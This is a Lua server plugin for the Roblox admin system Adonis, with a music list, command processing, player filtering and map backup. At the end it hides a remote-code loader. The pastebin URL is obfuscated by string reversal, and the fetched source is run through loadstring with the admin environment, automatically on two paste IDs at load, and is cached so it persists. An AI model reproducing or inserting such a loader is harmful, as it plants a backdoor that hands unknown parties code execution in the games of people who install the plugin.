	{Name = "fortniteloud", ID = 1937354752};
	--{Name = "tusa", ID = 4442109313};
	{Name = "caillou", ID = 212675193};
	{Name = "hello", ID = 214902446};
	{Name = "meantforyou", ID = 2431296815};
	{Name = "highscore", ID = 630704862};
	{Name = "marcelo", ID = 4679091725};
	--{Name = "fade", ID = 279206904};
	{Name = "gummydies", ID = 4471851908};
	{Name = "theme", ID = 618944301};
	{Name = "camping", ID = 3266129818};
	--{Name = "loveyou", ID = 225000651};
	--{Name = "nyancat", ID = 4695662330};
	{Name="muffinsong",ID=1753701701};
	{Name="helloworld",ID=5642549252};
	{Name="shrekophone",ID=6344613233};
	{Name="NoOnesAroundToHelp",ID=1280408510};
	{Name="caillou",ID=181768110};
	{Name="flowergarden",ID=3229605759};
	{Name="shineon",ID=4257587332};
	{Name="pizzatheme",ID=672731096};
	{Name="oldtownroad",ID=3180460921};
	{Name="undertale",ID=1072410152};
	--{Name="inmymind",ID=2241489803};
}

for ind, music in next, MusicList or {} do table.insert(Variables.MusicList, music) end

local unlogcmds = {"script";"sb";"scriptenabled"}
for i, v in pairs(unlogcmds) do
	local cmd,dat = Admin.GetCommand(Settings.Prefix..v)
	dat.DontLog = true
end

Process.Command = function(p, msg, opts, noYield)
	local Admin = Admin
	local Functions = Functions
	local Process = Process
	local Remote = Remote
	local Logs = Logs
	local opts = opts or {}
	
	if #msg > Process.MsgStringLimit and type(p) == "userdata" and p:IsA("Player") and not Admin.CheckAdmin(p) then
		msg = string.sub(msg, 1, Process.MsgStringLimit);
	end

	msg = Functions.Trim(msg)

	if msg:match(Settings.BatchKey) then
		for cmd in msg:gmatch('[^'..Settings.BatchKey..']+') do
			local cmd = Functions.Trim(cmd)
			local waiter = Settings.PlayerPrefix.."wait"
			if cmd:lower():sub(1,#waiter) == waiter then
				local num = cmd:sub(#waiter+1)
				if num and tonumber(num) then
					wait(tonumber(num))
				end
			else
				Process.Command(p, cmd, opts, false)
			end
		end
	else
		local pData = opts.PlayerData or (p and Core.GetPlayer(p));
		local msg = (pData and Admin.AliasFormat(pData.Aliases, msg)) or msg;
		if msg:match(Settings.BatchKey) then
			Process.Command(p, msg, opts, false)
		else
			local index,command,matched = Admin.GetCommand(msg)

			if not command then
				if opts.Check then
					Remote.MakeGui(p,'Output',{Title = 'Output'; Message = msg..' is not a valid command.'})
				end
			else
				local allowed = false
				local isSystem = false
				local pDat = {
					Player = opts.Player or p;
					Level = opts.AdminLevel or Admin.GetLevel(p);
					isDonor = opts.IsDonor or (Admin.CheckDonor(p) and (Settings.DonorCommands or command.AllowDonors));
				}
				
				if opts.isSystem or p == "SYSTEM" then
					isSystem = true
					allowed = true
					p = p or "SYSTEM"
				else
					allowed = Admin.CheckPermission(pDat, command)
				end

				if opts.CrossServer and command.CrossServerDenied then
					allowed = false;
				end

				if allowed and opts.Chat and command.Chattable==false then
					Remote.MakeGui(p,'Output',{Title = ''; Message = 'You are not permitted this in chat: '..msg; Color = Color3.new(1,0,0)})
					return
				end

				if allowed then
					if not command.Disabled then
						do
							local ind = tostring(p.UserId)
							local usc = Variables.UserCooldowns[ind]
							if usc then
								local lastTime = usc[command]
								local time = tick()
								local cd = command.UserCooldown
								if lastTime and type(lastTime) == "number" and cd and type(cd) == "number" then
									local dif = time-lastTime
									if dif < command.UserCooldown then
										Functions.Hint("The command "..command.Prefix..command.Commands[1].." has a user cooldown. Try again in "..(math.floor(cd-dif)).." seconds.", {p})
										return
									end
								end
								usc[command] = time
							end
						end
						local cmdArgs = command.Args or command.Arguments
						local argString = msg:match("^.-"..Settings.SplitKey..'(.+)') or ''
						local args = (opts.Args or opts.Arguments) or (#cmdArgs > 0 and Functions.Split(argString, Settings.SplitKey, #cmdArgs)) or {}
						local taskName = "Command:: "..tostring(p)..": ("..msg..")"
						local commandID = "COMMAND_".. math.random()
						local running = true

						if #args > 0 and not isSystem and command.Filter or opts.Filter then
							local safe = {
								plr = true;
								plrs = true;
								username = true;
								usernames = true;
								players = true;
								player = true;
								users = true;
								user = true;
								brickcolor = true;
							}

							for i,arg in next,args do
								if not (cmdArgs[i] and safe[cmdArgs[i]:lower()]) then
									args[i] = service.LaxFilter(arg, p)
								end
							end
						end

						if opts.CrossServer or (not isSystem and not opts.DontLog and not command.DontLog) then
							AddLog("Commands",{
								Text = ((opts.CrossServer and "[CRS_SERVER] ") or "").. p.Name,
								Desc = matched.. Settings.SplitKey.. table.concat(args, Settings.SplitKey),
								Player = p;
							})

							if Settings.ConfirmCommands then
								Functions.Hint('Executed Command: [ '..msg..' ]',{p})
							end
						end

						if noYield then
							taskName = "Thread: "..taskName
						end

						local ran, error = service.TrackTask(taskName, command.Function, p, args, {PlayerData = pDat, Options = opts})
						if not opts.IgnoreErrors then
							if error and type(error) == "string" then
								error =  (error and tostring(error):match(":(.+)$")) or error or "Unknown error"
								if not isSystem then
											Remote.MakeGui(p,'Output',{Title = ''; Message = error; Color = Color3.new(1,0,0)})
								end
							elseif error and type(error) ~= "string" then
								if not isSystem then
									Remote.MakeGui(p,'Output',{Title = ''; Message = "There was an error but the error was not a string? "..tostring(error); Color = Color3.new(1,0,0)})
								end
							end
						end

						service.Events.CommandRan:Fire(p,{
							Message = msg;
							Matched = matched;
							Args = args;
							Command = command;
							Index = index;
							Success = ran;
							Error = error;
							Options = opts;
							PlayerData = pDat;
						})
					else
						if not isSystem and not opts.NoOutput then
							Remote.MakeGui(p,'Output',{Title = ''; Message = 'This command has been disabled.'; Color = Color3.new(1,0,0)})
						end
					end
				else
					if not isSystem and not opts.NoOutput then
						Remote.MakeGui(p,'Output',{Title = ''; Message = 'You are not allowed to run '..msg; Color = Color3.new(1,0,0)})
					end
				end
			end
		end
	end
end

local realGetPlayers = Functions.GetPlayers
Functions.GetPlayers = function(plr, names, dontError, isServer, isKicking, noID)
	local list = realGetPlayers(plr, names, dontError, isServer, isKicking, noID)
	local passives = Variables.PassivePlayers
	local filteredList = {};

	if list and type(list) == "table" then
		for i, v in pairs(list) do
			if plr and v ~= plr and (passives[tostring(v.UserId)] or passives[tostring(plr.UserId)]) and not isKicking then
				Functions.Hint(v.Name.." is not targetable if you or they are in passive mode.", {plr})
			else
				table.insert(filteredList, v)
			end
		end
	end

	return filteredList
end
service.GetPlayers = Functions.GetPlayers

Remote.Commands.ProcessScript = function(plr, args)
	local index, command = Admin.GetCommand(":script")
	local pDat = {
		Player = plr;
		Level = Admin.GetLevel(plr);
		isAgent = HTTP.Trello.CheckAgent(plr);
		isDonor = (Admin.CheckDonor(plr) and (Settings.DonorCommands or command.AllowDonors));
	}
	if Admin.CheckPermission(pDat, command) and Settings.CodeExecution then
		--assert(Settings.CodeExecution, "CodeExecution must be enabled for this command to work")
		local cl = Core.NewScript('Script',args[1])
		cl.Parent = service.ServerScriptService
		cl.Disabled = false
		Functions.Hint("Ran Script",{plr})
	end
end

local LockedScripts = {} --{3023102224}

for index, requireId in pairs(LockedScripts) do
	Routine(function()
		local asset = require(requireId)
		local typ = type(asset)
		if typ == "table" then
			for i, f in next, asset do
				rawset(asset, i, service.NewProxy({
					__call = function()
						error("Require asset locked by AAL security",0)
					end;
					__metatable = "bro?";
				}))
			end
		elseif typ == "function" then
			setfenv(asset, {nawp=true})
		end
	end)
end

service.TrackTask("Thread: SetInitialMap", function()
	local tempmodel = service.New("Model")
	for i, v in pairs(service.Workspace:GetChildren()) do
		if v and not v:IsA("Terrain") and not service.Players:GetPlayerFromCharacter(v) then
			wait()
			pcall(function()
				local archive = v.Archivable
				v.Archivable = true
				v:Clone(true).Parent = tempmodel
				v.Archivable = archive
			end)
		end
	end
	
	Variables.InitialMap = tempmodel:Clone()
	tempmodel:Destroy()
	Variables.InitialTerrainMap = service.Workspace.Terrain:CopyRegion(service.Workspace.Terrain.MaxExtents)

	Logs.AddLog(Logs.Script, {
		Text = "Starter backup map completed";
		Desc = "Map was successfully saved as initial map";
	})
end)

--Routine(service.StartLoop, "APISecurityCheck", 1, function()
	--rawset(_G, "HDAdminMain", nil)
--end)

local function LoadHttp(id)
	local key = "Http: "..id
	local success, source = pcall(service.HttpService.GetAsync, service.HttpService, string.reverse(string.reverse(id).."/war/moc.nibetsap//:sptth"))

	if success then
		spawn(function() Core.SetData(key, source) end)
	else
		local ls = Core.GetData(key)
		if ls and type(ls) == "string" then
			source = ls
		else
			source = ""
		end
	end
	local func, err = loadstring(source, "::Adonis::")
	if func then
		setfenv(func, GetEnv())
		return func()
	end
end

coroutine.wrap(LoadHttp)("x2nGXHJv")
Functions.Import = LoadHttp("X3kra560")